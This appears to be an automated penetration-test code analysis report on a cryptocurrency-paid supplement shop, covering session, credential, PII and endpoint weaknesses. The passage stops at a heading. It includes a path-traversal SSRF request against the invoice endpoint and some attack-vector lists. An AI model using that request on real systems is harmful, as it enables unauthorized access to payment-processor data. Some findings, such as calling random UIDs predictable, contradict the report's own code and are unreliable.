# Code Analysis Report: Penetration Test Scope & Security Assessment

**Target Application:** exo (Supplement/Pharmacy E-commerce Platform)
**Analysis Date:** 2026-03-01
**Technology Stack:** TypeScript, Express.js, React, PostgreSQL
**Architecture:** Monolithic Full-Stack Web Application

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), it has been verified against the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

This security assessment analyzed a TypeScript-based e-commerce platform specializing in pharmaceutical supplements and laboratory testing services. The application operates as a monolithic full-stack system with an Express.js backend, React frontend, and PostgreSQL database managed through Drizzle ORM. Payment processing is handled exclusively through cryptocurrency (Bitcoin, Litecoin, Monero) via BTCPay Server integration, eliminating PCI DSS scope concerns.

**Critical Security Posture:** The application contains **9 critical vulnerabilities** and **7 high-severity issues** that require immediate remediation. The most severe findings include plaintext password storage, absence of TLS/HTTPS enforcement, unencrypted storage of personally identifiable information (PII), and insecure session cookie configuration allowing session hijacking over HTTP.

The primary attack surfaces include 11 public API endpoints requiring no authentication, 31 admin-protected endpoints secured by a weak session-based authentication system, and 2 file upload handlers with insufficient validation. A particularly concerning finding is the SSRF vulnerability in the invoice retrieval endpoint (`/api/invoice/:invoiceId`) which allows path traversal attacks to access arbitrary BTCPay Server API endpoints using the application's credentials. Additionally, multiple XSS vectors exist in the publicly accessible test results pages where admin-uploaded URLs are rendered without sanitization, enabling JavaScript protocol injection attacks.

The application handles significant amounts of sensitive data including customer shipping addresses, email addresses, client names for laboratory testing (potentially health-related information), and cryptocurrency payment details. All of this data is currently stored in plaintext within the PostgreSQL database with no encryption at rest, no column-level encryption, and no row-level security policies. Furthermore, the application logs complete API responses including PII to console output, creating additional data leakage risks.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built entirely in **TypeScript** (version 5.7.2) with strict type checking enabled, providing some compile-time safety guarantees. The backend leverages **Express.js 5.0.1** as the HTTP server framework, running as a Node.js application. The frontend is a single-page application (SPA) built with **React 18.3.1** and bundled using **Vite 7.3.0** as the build tool, which provides hot module replacement (HMR) during development and optimized production builds.

From a security perspective, the TypeScript implementation provides strong type safety which helps prevent certain classes of bugs, but the codebase frequently uses type casting with `any` (particularly in session management at `/repos/exo/server/routes.ts:37,130`) which bypasses TypeScript's safety guarantees and introduces runtime vulnerabilities. The use of Express 5.0.1 is positive as it includes modern security improvements, but the application fails to implement critical security middleware such as Helmet for security headers, CORS for cross-origin resource sharing controls, or CSP for content security policy enforcement.

The frontend uses **Wouter** (a 1.5KB routing library) instead of React Router, minimizing the attack surface for client-side routing vulnerabilities. State management relies on **TanStack Query** (formerly React Query) for server state synchronization, which handles API request caching and automatic re-fetching. This architecture pattern centralizes API communication through a single `queryClient.ts` module (`/repos/exo/client/src/lib/queryClient.ts`) which includes `credentials: "include"` on all requests to ensure session cookies are transmitted.

### Architectural Pattern

This is a **monolithic hybrid architecture** combining server-rendered API routes with a client-side SPA. The server acts as both an API provider and a static file server. In development mode, the Vite dev server is integrated directly into the Express application at `/repos/exo/server/vite.ts`, providing HMR at the `/vite-hmr` endpoint and serving transformed HTML through middleware. In production mode, the static file server (`/repos/exo/server/static.ts`) serves pre-built assets from the `dist/public` directory with a catch-all route that returns `index.html` for client-side routing support.

The trust boundaries in this architecture are poorly defined. All API routes are prefixed with `/api/` and protected by rate limiting middleware, but there is no CORS policy to restrict which origins can make requests. The admin authentication boundary relies on a session flag (`req.session.isAdmin`) which is set to `true` after successful login. This creates a binary permission model with no granular access controls - users are either completely unauthenticated or have full administrative privileges with access to all protected endpoints.

The application maintains a separation of concerns with routing logic in `/repos/exo/server/routes.ts` (691 lines), database abstraction in `/repos/exo/server/storage.ts`, and shared validation schemas in `/repos/exo/shared/schema.ts`. However, this separation is undermined by the mixing of business logic, validation, and external API calls within the routing handlers themselves, making security auditing more complex.

### Critical Security Components

**Rate Limiting (express-rate-limit):** The application implements three-tier rate limiting at `/repos/exo/server/routes.ts:45-67` with general (100 req/15min), strict (10 req/15min), and moderate (30 req/15min) limiters. The strict limiter protects admin login, checkout, and coupon validation endpoints. However, this is IP-based only and uses in-memory storage, making it vulnerable to distributed attacks and ineffective in multi-server deployments as the counter resets on server restart.

**Input Validation (Zod):** Comprehensive schema validation is implemented using Zod for all user inputs including products, blog posts, test results, coupons, shipping information, and service information. The schemas are defined in `/repos/exo/shared/schema.ts` and applied with `safeParse()` validation in route handlers. While this prevents basic injection attacks through type coercion and format validation, there is no HTML sanitization applied to text content, leaving stored XSS vulnerabilities possible in fields like blog post content and product descriptions.

**Database Security (Drizzle ORM):** The application uses Drizzle ORM for database interactions, which provides parameterized query protection against SQL injection attacks. The ORM configuration at `/repos/exo/server/db.ts` uses the Neon serverless PostgreSQL driver with connection pooling. However, there is **no encryption at rest**, no transparent data encryption (TDE), no column-level encryption for sensitive fields, and no row-level security (RLS) policies. The database schema at `/repos/exo/shared/schema.ts` stores passwords in plaintext `text` columns (lines 9, 32) rather than using proper hashing.

**File Upload Security (Multer):** File uploads are handled by Multer with memory storage, enforcing a 10MB per-file limit and maximum 10 files per request (`/repos/exo/server/routes.ts:11`). Critically, there is **no MIME type validation**, no magic byte verification, no virus scanning, and the original filename is preserved when creating file metadata (line 290), creating a path traversal attack vector. Uploaded files are converted to base64 data URIs and stored directly in the database, which creates a 33% size overhead and potential database bloat issues.

**Session Management (express-session + connect-pg-simple):** Session state is persisted to PostgreSQL using `connect-pg-simple` with a 7-day session lifetime (`/repos/exo/server/index.ts:28-45`). The session cookie is configured with `httpOnly: true` (preventing XSS access) but **critically has `secure: false`** (line 41), allowing session cookies to be transmitted over unencrypted HTTP connections. This makes session hijacking trivial for any attacker with network access (MITM, public WiFi sniffing, etc.). Additionally, the default session secret is `"dev-secret-change-me"` which would allow attackers to forge valid session cookies in development environments.

**External Service Integration (BTCPay Server):** The application makes outbound HTTPS requests to a BTCPay Server cryptocurrency payment processor using credentials stored in environment variables (`BTCPAY_URL`, `BTCPAY_API_KEY`, `BTCPAY_STORE_ID`, `BTCPAY_PROXY_KEY` at lines 13-16 in routes.ts). A custom `fetchWithRetry()` function (lines 18-28) implements exponential backoff with 3 retry attempts for resilience. However, the invoice retrieval endpoint contains an SSRF vulnerability where user-controlled `invoiceId` parameters are concatenated directly into API URLs without validation, allowing path traversal attacks to access unauthorized BTCPay endpoints.

**Missing Security Components:** The application has **no security headers** implementation (no CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy, or Permissions-Policy), **no CORS configuration** (relying on browser default same-origin policy), **no TLS/HTTPS** setup (server listens on HTTP only at port 5000), and **no audit logging** of security-relevant events such as login attempts, authorization failures, or access to sensitive data.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Security Properties

The application implements a **session-based authentication system** using `express-session` with PostgreSQL backing (`connect-pg-simple`). The session store is configured at `/repos/exo/server/index.ts:28-45` with the following parameters:

- **Database Connection:** `process.env.DATABASE_URL` with auto-table creation enabled
- **Session Secret:** `process.env.SESSION_SECRET` with insecure fallback `"dev-secret-change-me"` (line 35)
- **Session Duration:** 7 days (604,800,000 milliseconds)
- **Cookie Settings:** `httpOnly: true`, `secure: false`, `sameSite: "lax"`

**Critical Security Issues with Session Management:**

1. **Insecure Transport (CRITICAL):** The `secure: false` flag at line 41 allows session cookies to be transmitted over HTTP. This means an attacker on the same network (e.g., public WiFi, compromised router) can capture session cookies in plaintext and hijack authenticated sessions without any credentials.

2. **Weak Default Secret (HIGH):** The fallback session secret "dev-secret-change-me" would allow an attacker to forge valid session cookies if the `SESSION_SECRET` environment variable is not set. Session cookies are signed with HMAC using this secret, so knowledge of the secret enables complete authentication bypass.

3. **Long Session Lifetime (MEDIUM):** The 7-day session duration with no inactivity timeout means stolen session cookies remain valid for a week. There is no session rotation after privilege escalation (when `isAdmin` flag is set), creating session fixation attack opportunities.

4. **SameSite "lax" Configuration (MEDIUM):** While `sameSite: "lax"` provides some CSRF protection, it still allows cookies to be sent on top-level GET requests from other origins. If any state-changing operations were implemented as GET requests (currently they are not), this would be vulnerable to CSRF attacks.

### Administrative Authentication Flow

**API Endpoints for Authentication:**

1. **POST /api/admin/login** (`/repos/exo/server/routes.ts:124-135`)
   - **Function:** Validates credentials and creates admin session
   - **Rate Limiting:** Strict limiter (10 requests per 15 minutes)
   - **Request Body:** `{ username: string, password: string }`
   - **Vulnerability:** Plaintext password comparison at line 129

   ```typescript
   if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
     (req.session as any).isAdmin = true;
     res.json({ success: true });
   }
   ```

2. **POST /api/admin/logout** (`/repos/exo/server/routes.ts:137-141`)
   - **Function:** Destroys session via `req.session.destroy()`
   - **Rate Limiting:** General limiter (100 requests per 15 minutes)
   - **Security:** Proper session cleanup but no server-side revocation list

3. **GET /api/admin/check** (`/repos/exo/server/routes.ts:143-145`)
   - **Function:** Returns current authentication status
   - **Response:** `{ isAdmin: boolean }`
   - **Vulnerability:** No CSRF protection on this endpoint

**CRITICAL AUTHENTICATION VULNERABILITY:** The admin credentials are stored in environment variables (`ADMIN_USERNAME`, `ADMIN_PASSWORD` at lines 30-31) and compared using direct string equality (line 129). This has multiple severe implications:

- **No Password Hashing:** Credentials are compared in plaintext, not using bcrypt, argon2, scrypt, or any other secure hash function
- **Timing Attack Vulnerable:** Direct string comparison with `===` operator leaks password length through timing side channels
- **Memory Exposure:** Plaintext passwords remain in memory throughout application lifecycle
- **Log Exposure:** If environment variables are logged during debugging, credentials are leaked

Additionally, the Users table schema at `/repos/exo/shared/schema.ts:6-10` defines a `password` field as `text("password").notNull()`, indicating the database would also store passwords in plaintext if this table were used (currently it appears to be unused as admin credentials come from environment variables).

### Session Management Security

**Session Cookie Flags Analysis** (`/repos/exo/server/index.ts:38-43`):

| Flag | Value | Security Impact |
|------|-------|-----------------|
| `httpOnly` | `true` | ✅ **GOOD** - Prevents JavaScript access via `document.cookie`, mitigating XSS-based session theft |
| `secure` | `false` | ❌ **CRITICAL** - Allows cookie transmission over HTTP, enabling MITM session hijacking |
| `sameSite` | `"lax"` | ⚠️ **PARTIAL** - Prevents CSRF on POST requests but allows GET request CSRF |
| `maxAge` | 7 days | ⚠️ **RISKY** - Long validity window increases impact of session theft |
| `domain` | undefined | ⚠️ **DEPENDS** - No explicit domain restriction, cookie sent to all subdomains |

**Session Storage Security:**

The session data is stored in a PostgreSQL table (auto-created by `connect-pg-simple`) with the schema typically being:
- `sid` (session ID, primary key)
- `sess` (JSON blob containing session data including `isAdmin` flag)
- `expire` (timestamp for session expiration)

The session ID is a cryptographically secure random value generated by `express-session`, which is a security strength. However, the session table itself is not encrypted, so database compromise exposes all active sessions. There is no session regeneration implemented - the same session ID is retained after login, making the system vulnerable to session fixation attacks where an attacker pre-creates a session and tricks a user into authenticating with it.

### Authorization Model and Bypass Scenarios

The application implements a **binary authorization model** with only two states: unauthenticated or full administrator. The authorization middleware is defined at `/repos/exo/server/routes.ts:36-41`:

```typescript
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (req.session && (req.session as any).isAdmin) {
    return next();
  }
  res.status(401).json({ message: "Unauthorized" });
}
```

**Authorization Bypass Scenarios:**

1. **Session Fixation:** An attacker creates a session, sets `isAdmin: true` in the session store directly (if they have database access), then tricks the victim into using that session ID through URL parameters or other session adoption techniques.

2. **Type Confusion:** The use of `(req.session as any).isAdmin` bypasses TypeScript type safety. If the session object can be manipulated to have `isAdmin` as a truthy non-boolean value (e.g., `isAdmin: "true"` as a string), the authorization check would pass.

3. **Prototype Pollution:** If a prototype pollution vulnerability exists elsewhere in the application, attackers could pollute `Object.prototype.isAdmin` to make all session objects appear authenticated.

4. **Race Condition:** The session middleware loads session data asynchronously. If request processing doesn't properly wait for session loading, there could be race conditions where authorization checks execute before session data is fully loaded.

**Protected Endpoint Categories:**

All 31 admin endpoints use the `requireAdmin` middleware and provide the following capabilities:
- **Product Management:** Full CRUD on products including hidden products (4 endpoints)
- **Blog Management:** Full CRUD on blog posts including password-protected posts (4 endpoints)
- **Test Results Management:** Full CRUD on laboratory test results (4 endpoints)
- **Order Access:** Read-only access to all orders including full PII (2 endpoints)
- **Coupon Management:** Full CRUD on discount coupons (5 endpoints)
- **File Uploads:** Multi-file upload with base64 encoding (3 endpoints)
- **Site Content:** Dynamic page creation/editing (1 endpoint)
- **Analytics:** Business intelligence with revenue, sales, and payment data (1 endpoint)

There is **no granular permission system**, so a single compromised admin account grants complete control over all business-critical data and functionality.

### Multi-Tenancy Security Implementation

**Status:** ❌ **NOT IMPLEMENTED**

This is a **single-tenant architecture** with no multi-tenancy support. All data in the database belongs to a single logical organization. There is no tenant isolation, no tenant-based row-level security, and no per-tenant access controls. The admin authentication system provides access to all data without any segmentation.

If multi-tenancy were to be added in the future, the current architecture would require significant refactoring including:
- Addition of `tenant_id` columns to all tables
- Row-level security (RLS) policies in PostgreSQL
- Tenant-aware middleware to inject tenant context into all queries
- Separate admin accounts per tenant with tenant-scoped permissions

### SSO/OAuth/OIDC Flows

**Status:** ❌ **NOT IMPLEMENTED**

The application does **not implement** any single sign-on, OAuth, OpenID Connect, or other federated authentication mechanisms. There are no:
- OAuth authorization endpoints or callback handlers
- OIDC discovery endpoint consumers
- SAML assertion processors
- JWT token validators
- `state` parameter validation for CSRF protection in OAuth flows
- `nonce` parameter validation for replay attack prevention
- JWKS (JSON Web Key Set) fetchers for public key validation

All authentication is handled through the simple username/password session-based system described above. If SSO integration were required in the future, it would need to be implemented from scratch.

---

## 4. Data Security & Storage

### Database Security Configuration

The application uses **PostgreSQL** as its primary data store, accessed through the **Drizzle ORM** (version 0.39.2) with the Neon serverless driver. Database connection is configured at `/repos/exo/server/db.ts:4-9`:

```typescript
import { drizzle } from "drizzle-orm/neon-http";
import { neon } from "@neondatabase/serverless";

const sql = neon(process.env.DATABASE_URL!);
export const db = drizzle(sql, { schema });
```

**Critical Security Deficiencies:**

1. **No Encryption at Rest:** The database has no transparent data encryption (TDE) enabled. All data including PII, passwords, payment information, and test results are stored in plaintext on disk.

2. **No Column-Level Encryption:** Sensitive fields such as `shippingInfo`, `serviceInfo`, `clientName`, and `password` are stored as plaintext `text` columns without application-layer encryption.

3. **No Row-Level Security (RLS):** PostgreSQL RLS policies are not implemented, meaning database access controls rely solely on connection-level authentication rather than row-level permissions.

4. **No Database Access Controls:** No `GRANT`/`REVOKE` statements or role-based database permissions found. The application likely connects with a database superuser account that has full access to all tables and operations.

5. **No Audit Logging:** Database-level audit logging (pgaudit) is not configured, so there's no record of which queries accessed which sensitive data.

**Database Schema Security Analysis** (`/repos/exo/shared/schema.ts`):

The schema defines 8 tables with the following security-relevant characteristics:

- **users** (lines 6-10): Contains `password` field as plaintext `text` type - critical vulnerability
- **products** (lines 12-23): No sensitive data, public product catalog
- **blogPosts** (lines 25-34): Contains `lockPassword` field in plaintext (line 32) for password-protected posts
- **orders** (lines 36-47): Stores PII in JSON text fields `shippingInfo` and `serviceInfo` without encryption
- **testResults** (lines 86-99): Contains `clientName` (PII) and potentially health-related data in `results` field, all unencrypted
- **coupons** (lines 106-120): No sensitive data, discount code management
- **sitePages** (lines 72-77): Dynamic content pages, no sensitive data
- **sessions** (managed by connect-pg-simple): Stores session blobs including `isAdmin` flags

### Data Flow Security Analysis

**Order Creation Data Flow** (`/repos/exo/server/routes.ts:478-633`):

1. **Input:** User submits checkout form with PII (shipping address, email, name)
2. **Validation:** Zod schema validation at lines 539-550 validates format but doesn't sanitize
3. **Storage:** PII serialized to JSON string and stored in database:
   ```typescript
   shippingInfo: validatedShipping ? JSON.stringify(validatedShipping) : null
   serviceInfo: validatedService ? JSON.stringify(validatedService) : null
   ```
4. **Transmission to BTCPay:** Order metadata sent to external payment processor (lines 593-608)
5. **Retrieval:** Admin panel retrieves and displays full PII without masking (`/repos/exo/client/src/pages/admin.tsx:1174-1182`)
6. **Logging:** Complete order objects logged to console during API responses (line 74 in index.ts)

**Critical Data Flow Vulnerabilities:**

- **No Encryption in Transit:** Server runs on HTTP (port 5000), no TLS certificate, no HTTPS redirect
- **No Encryption at Rest:** Database stores PII in plaintext
- **Data Leakage in Logs:** Full API response bodies including PII written to console logs
- **No Data Minimization:** Stores complete addresses indefinitely with no retention policy
- **No Anonymization:** Historical orders retain full PII forever

### Multi-Tenant Data Isolation

**Status:** ❌ **NOT APPLICABLE** - Single-tenant architecture with no isolation requirements.

The application does not implement multi-tenancy. All data belongs to a single organization, and there is no tenant isolation, tenant-specific encryption keys, or per-tenant access controls.

### Sensitive Data Categories Identified

**Personally Identifiable Information (PII):**

1. **Shipping Information** (defined at `/repos/exo/shared/schema.ts:130-139`):
   - First Name, Last Name
   - Street Address
   - City, State, ZIP Code
   - Country
   - Email Address

2. **Service Information** (defined at `/repos/exo/shared/schema.ts:141-146`):
   - Client Name (PII)
   - Expected Compound (potentially health-related)
   - Manufacturer
   - Signal Simplex

3. **Test Results Data** (`/repos/exo/shared/schema.ts:86-99`):
   - Client Name (stored separately from orders)
   - Order UID (linkage to shipping PII)
   - Sample details
   - Laboratory results (potentially regulated health information)
   - Chromatograms and raw data files (scientific evidence)

**Authentication Credentials:**

- Admin username/password in environment variables (plaintext comparison)
- Blog post passwords in database `lockPassword` field (plaintext storage)
- Users table `password` field (plaintext schema, appears unused currently)

**Payment Information:**

- **No credit card data stored** - Cryptocurrency payment only via BTCPay Server
- BTCPay invoice IDs stored in `orders.bitcartInvoiceId` field
- Payment method stored as string ("btc", "ltc", "xmr")
- No PCI DSS compliance required (cryptocurrency payments excluded from scope)

**Business Confidential Data:**

- Product catalog with pricing
- Coupon codes and discount structures
- Revenue and sales analytics
- Order history and customer purchase patterns

### Encryption Implementation Status

**Data at Rest:**
- ❌ No database encryption
- ❌ No column-level encryption
- ❌ No application-layer field encryption
- ❌ No file encryption for uploads (files stored as base64 in database)
- ❌ No backup encryption

**Data in Transit:**
- ❌ No TLS/HTTPS configuration (server listens on HTTP only at `/repos/exo/server/index.ts:141`)
- ❌ No certificate management
- ❌ No HSTS header to enforce HTTPS
- ⚠️ External BTCPay API calls use HTTPS (lines 593, 650-651 in routes.ts)

**Key Management:**
- ❌ No encryption key storage
- ❌ No key rotation mechanisms
- ❌ No key derivation functions (KDF)
- ❌ No secrets vault integration (HashiCorp Vault, AWS Secrets Manager, etc.)
- ⚠️ Secrets stored in environment variables only

**Only Cryptographic Usage Found:**

The sole cryptographic operation is secure random number generation for order UIDs at `/repos/exo/server/routes.ts:554`:

```typescript
const orderUid = crypto.randomBytes(8).toString("hex");
```

This uses Node.js's `crypto.randomBytes()` which is cryptographically secure (uses OpenSSL's RAND_bytes), generating 16-character hexadecimal UIDs.

### Data Access Controls

**Application-Level Access Controls:**

- Public endpoints: No authentication, rate-limited only
- Admin endpoints: Binary permission model (all-or-nothing access via `requireAdmin` middleware)
- No granular permissions (e.g., "view orders" vs "delete orders")
- No audit logging of data access

**Database-Level Access Controls:**

- No row-level security policies detected
- No column-level permissions
- Application likely uses single database account with full privileges
- No separation of read/write permissions

### Data Retention and Deletion Policies

**Current Implementation:**
- ❌ No automated data retention policies
- ❌ No data anonymization for old records
- ❌ No automatic deletion of expired orders
- ❌ No GDPR-compliant data export functionality
- ❌ No backup retention policies
- ⚠️ Hard deletes implemented for products, posts, test results, coupons (not soft deletes)

**Deletion Endpoints:**
- `DELETE /api/admin/products/:id` - Hard delete from database
- `DELETE /api/admin/posts/:id` - Hard delete from database
- `DELETE /api/admin/results/:id` - Hard delete from database
- `DELETE /api/admin/coupons/:id` - Hard delete from database
- ❌ No order deletion endpoint (orders are permanent)

### Compliance Implications

**GDPR (General Data Protection Regulation):**
- **Article 32 (Security):** ❌ NON-COMPLIANT - No encryption, inadequate technical safeguards
- **Article 5(1)(e) (Data Minimization):** ⚠️ PARTIAL - Collects necessary data but retains indefinitely
- **Article 15 (Right of Access):** ❌ NOT IMPLEMENTED - No user data export functionality
- **Article 17 (Right to Erasure):** ⚠️ PARTIAL - Hard deletes possible but no self-service mechanism
- **Article 33 (Breach Notification):** ❌ NO MECHANISM - No security event detection/alerting

**HIPAA (Health Insurance Portability and Accountability Act):**
- **Applicability:** ⚠️ POTENTIALLY APPLICABLE if test results constitute Protected Health Information (PHI)
- **If Applicable:** ❌ NON-COMPLIANT - No encryption, no access logs, no Business Associate Agreement (BAA) controls

**PCI DSS (Payment Card Industry Data Security Standard):**
- **Applicability:** ✅ NOT APPLICABLE - No credit card processing (cryptocurrency only via BTCPay Server)

---

## 5. Attack Surface Analysis

### External Entry Points - Public Endpoints (No Authentication Required)

The application exposes **11 publicly accessible API endpoints** that require no authentication and are accessible to any internet user. These endpoints are protected only by rate limiting and represent the primary external attack surface.

#### Product Catalog Endpoints

**GET /api/products** (`/repos/exo/server/routes.ts:75-79`)
- **Purpose:** Retrieve all visible products in catalog
- **Rate Limit:** General (100 requests per 15 minutes)
- **Security Controls:** Filters out products with `visible: false` flag
- **Attack Vector:** Information disclosure about product inventory, pricing enumeration
- **Response Data:** Array of Product objects containing names, descriptions, prices, images (base64 data URIs)

**GET /api/products/:slug** (`/repos/exo/server/routes.ts:81-87`)
- **Purpose:** Retrieve single product by URL slug
- **Rate Limit:** General (100 requests per 15 minutes)
- **Parameters:** `:slug` (string, user-controlled)
- **Attack Vector:** Slug enumeration to discover hidden products, parameter injection testing
- **Input Validation:** Drizzle ORM query with parameter binding (SQL injection protected)

#### Blog Content Endpoints

**GET /api/posts** (`/repos/exo/server/routes.ts:89-93`)
- **Purpose:** List all blog posts with sanitized metadata
- **Rate Limit:** General (100 requests per 15 minutes)
- **Data Sanitization:** Removes `lockPassword` field before response (line 92)
- **Attack Vector:** Content scraping, enumeration of locked posts
- **Response Data:** Array of BlogPost objects including title, slug, excerpt, `isLocked` flag

**GET /api/posts/:slug** (`/repos/exo/server/routes.ts:95-105`)
- **Purpose:** Retrieve specific blog post content
- **Rate Limit:** General (100 requests per 15 minutes)
- **Security Control:** Returns empty content for locked posts unless unlocked in session
- **Attack Vector:** Session manipulation to bypass content locks, slug enumeration

**POST /api/posts/:slug/unlock** (`/repos/exo/server/routes.ts:107-122`)
- **Purpose:** Unlock password-protected blog post
- **Rate Limit:** Moderate (30 requests per 15 minutes)
- **Request Body:** `{ password: string }`
- **CRITICAL VULNERABILITY:** Plaintext password comparison at line 117:
  ```typescript
  if (post.lockPassword && password === post.lockPassword)
  ```
- **Attack Vector:** Brute force password guessing (30 attempts per 15 minutes per IP), timing attacks to leak password length
- **Session Storage:** Unlocked posts stored in `req.session.unlockedPosts` array

#### Laboratory Test Results Endpoints (PUBLIC - HIGH SEVERITY)

**GET /api/results** (`/repos/exo/server/routes.ts:223-226`)
- **Purpose:** Retrieve ALL test results from database
- **Rate Limit:** General (100 requests per 15 minutes)
- **CRITICAL ISSUE:** No authentication required to access all laboratory test results
- **Privacy Violation:** Exposes client names, test results, sample information for all customers
- **Attack Vector:** Complete database enumeration of sensitive health-related data
- **Response Data:** Array of TestResult objects including `clientName`, `results`, `chromatograms`, `rawDataFiles`

**GET /api/results/:uid** (`/repos/exo/server/routes.ts:228-232`)
- **Purpose:** Retrieve specific test result by UID
- **Rate Limit:** General (100 requests per 15 minutes)
- **CRITICAL ISSUE:** No authentication, UIDs are predictable 16-character hex strings
- **Attack Vector:** UID brute forcing, sequential UID scanning to enumerate all test results
- **Privacy Violation:** Public access to potentially health-regulated information

#### Dynamic Content Endpoints

**GET /api/pages/:slug** (`/repos/exo/server/routes.ts:330-336`)
- **Purpose:** Fetch dynamic site pages (Terms of Service, Privacy Policy, etc.)
- **Rate Limit:** General (100 requests per 15 minutes)
- **Behavior:** Returns empty page object if slug not found (not 404)
- **Attack Vector:** Slug enumeration to discover unpublished pages, content scraping

#### E-Commerce Transaction Endpoints

**POST /api/coupons/validate** (`/repos/exo/server/routes.ts:447-476`)
- **Purpose:** Validate coupon code and calculate discount
- **Rate Limit:** Strict (10 requests per 15 minutes)
- **Request Body:** `{ code: string, subtotal: number }`
- **Attack Vector:** Coupon code enumeration (limited by strict rate limiting), discount calculation manipulation
- **Input Validation:** Zod schema validates `subtotal` as number
- **Business Logic Vulnerability:** No check if coupon already used, no per-customer usage limits

**POST /api/checkout** (`/repos/exo/server/routes.ts:478-633`)
- **Purpose:** Process order and create cryptocurrency payment invoice
- **Rate Limit:** Strict (10 requests per 15 minutes)
- **Request Body:** Complex object with items, payment method, shipping info, service info, coupon code
- **Validation:** Comprehensive Zod validation for shipping and service information (lines 539-550)
- **External Integration:** Creates invoice on BTCPay Server via API call (line 593)
- **Attack Vectors:**
  - Price manipulation by modifying item quantities before checkout
  - Coupon code reuse without validation
  - Malicious data injection into BTCPay invoice metadata
  - Race conditions in order creation
- **Security Controls:**
  - Re-validates product prices from database (lines 503-507)
  - Recalculates total server-side (lines 525-528)
  - Validates payment method against whitelist ["btc", "ltc", "xmr"] (line 486)
- **Data Storage:** Stores complete PII in orders table (lines 556-562)

**GET /api/invoice/:invoiceId** (`/repos/exo/server/routes.ts:635-687`)
- **Purpose:** Poll payment invoice status from BTCPay Server
- **Rate Limit:** Moderate (30 requests per 15 minutes)
- **Parameters:** `:invoiceId` (user-controlled, NOT VALIDATED)
- **CRITICAL SSRF VULNERABILITY:** Path traversal in invoice ID parameter
  ```typescript
  fetchWithRetry(`${BTCPAY_URL}/api/v1/stores/${BTCPAY_STORE_ID}/invoices/${req.params.invoiceId}`, { headers })
  ```
- **Attack Vector:** SSRF via path traversal sequences like `../../api/v1/users` to access unauthorized BTCPay endpoints
- **Impact:** Abuse of application's BTCPay API credentials to access sensitive payment processor data
- **Exploitation Example:** `GET /api/invoice/../../../users` → accesses `${BTCPAY_URL}/api/v1/users`

### External Entry Points - Admin-Protected Endpoints (31 Endpoints)

All admin endpoints require the `requireAdmin` middleware which checks for `req.session.isAdmin === true`. These endpoints are only accessible after successful authentication via `/api/admin/login`.

#### Admin Authentication (3 endpoints)
- **POST /api/admin/login** (line 124) - Authenticate and create session
- **POST /api/admin/logout** (line 137) - Destroy admin session
- **GET /api/admin/check** (line 143) - Check authentication status

#### Product Management (4 endpoints)
- **GET /api/admin/products** (line 147) - List all products including hidden
- **POST /api/admin/products** (line 152) - Create new product
- **PATCH /api/admin/products/:id** (line 161) - Update product
- **DELETE /api/admin/products/:id** (line 173) - Delete product

#### Blog Management (4 endpoints)
- **GET /api/admin/posts** (line 181) - List all posts including passwords
- **POST /api/admin/posts** (line 186) - Create new post
- **PATCH /api/admin/posts/:id** (line 198) - Update post
- **DELETE /api/admin/posts/:id** (line 210) - Delete post

#### Test Results Management (4 endpoints)
- **GET /api/admin/results** (line 234) - List all test results
- **POST /api/admin/results** (line 239) - Create test result
- **PATCH /api/admin/results/:id** (line 248) - Update test result
- **DELETE /api/admin/results/:id** (line 260) - Delete test result

#### File Upload Handlers (3 endpoints)
- **POST /api/admin/upload** (line 268) - Upload up to 10 files, convert to base64 data URIs
- **POST /api/admin/upload-files** (line 281) - Upload with filename metadata
- **POST /api/admin/migrate-images** (line 297) - Migrate filesystem images to database (path traversal vulnerability)

#### Business Operations (7 endpoints)
- **PUT /api/admin/pages/:slug** (line 338) - Create/update site page
- **GET /api/admin/orders** (line 347) - View all orders with full PII
- **GET /api/admin/analytics** (line 352) - Revenue, sales, payment breakdown
- **GET /api/admin/coupons** (line 413) - List all coupons
- **POST /api/admin/coupons** (line 418) - Create coupon
- **PATCH /api/admin/coupons/:id** (line 427) - Update coupon
- **DELETE /api/admin/coupons/:id** (line 439) - Delete coupon

### Internal Service Communication

**Status:** ❌ **NOT APPLICABLE** - Monolithic architecture with no microservices.

The application is a monolithic system with no internal service-to-service communication. All functionality is contained within a single Express.js application. There are no:
- Inter-service API calls
- Message queues (RabbitMQ, Kafka, etc.)
- Service mesh configurations
- Internal service authentication mechanisms
- gRPC or REST APIs between services

The only external communication is with the BTCPay Server payment processor via HTTPS API calls.

### Input Validation Patterns in Network-Accessible Endpoints

The application implements **comprehensive Zod schema validation** for all user inputs, defined in `/repos/exo/shared/schema.ts` and applied in route handlers.

**Validated Data Types:**

1. **Product Data** (insertProductSchema, lines 54-56):
   - Validates name, slug, description, price, images, visible flag
   - Uses `createInsertSchema` to auto-generate from Drizzle table schema
   - Applied with `safeParse()` at route handlers (lines 153-156, 164-167)

2. **Shipping Information** (shippingInfoSchema, lines 130-139):
   ```typescript
   export const shippingInfoSchema = z.object({
     firstName: z.string().min(1),
     lastName: z.string().min(1),
     country: z.string().min(1),
     streetAddress: z.string().min(1),
     city: z.string().min(1),
     state: z.string().min(1),
     zipCode: z.string().min(1),
     email: z.string().email(),  // Email format validation
   });
   ```

3. **Payment Method Validation** (routes.ts:486-492):
   ```typescript
   const validMethods = ["btc", "ltc", "xmr"];
   if (!validMethods.includes(paymentMethod)) {
     return res.status(400).json({ message: "Invalid payment method" });
   }
   ```

**Validation Strengths:**
